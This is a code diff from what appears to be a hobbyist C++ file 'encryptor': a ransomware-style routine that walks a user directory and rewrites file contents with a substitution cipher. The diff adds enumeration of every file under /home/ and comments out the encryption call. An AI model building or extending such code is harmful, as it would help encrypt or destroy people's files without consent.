@@ -4,13 +4,10 @@
 #include <fstream>
 #include <random>
 #include <map>
+#include <unordered_map>
 
 auto encryptor(std::string &path, std::map<char, int> &encryption, char &byte) -> void {
     for (const auto &entry : std::filesystem::directory_iterator(path)) {
-        if (entry.is_directory()) {
-            encryptor(path, encryption, byte);
-        }
-
         std::ifstream read(entry.path());
 
         if (!read.is_open()) std::cerr << "[-] Could not open the file - '" << path << "'" << std::endl;
@@ -35,6 +32,20 @@ auto encryptor(std::string &path, std::map<char, int> &encryption, char &byte) -
 }
 
 auto main() -> int {
+
+    std::unordered_map<std::string, int> directories;
+
+    for (std::filesystem::recursive_directory_iterator i("/home/"), end; i != end; ++i) {
+        if (!is_directory(i->path())) {
+            directories[i->path().filename()];
+        }
+    }
+
+    for (auto &it : directories) {
+        it.second++;
+        std::cout << it.first << " - " << it.second << std::endl;
+    }
+
     auto path = std::string("/home/draco/TobeEncrypted");
     char byte = 0;
 
@@ -51,5 +62,5 @@ auto main() -> int {
         encryption[combination] = key;
     }
 
-    encryptor(path, encryption, byte);
+    //encryptor(path, encryption, byte);
 }
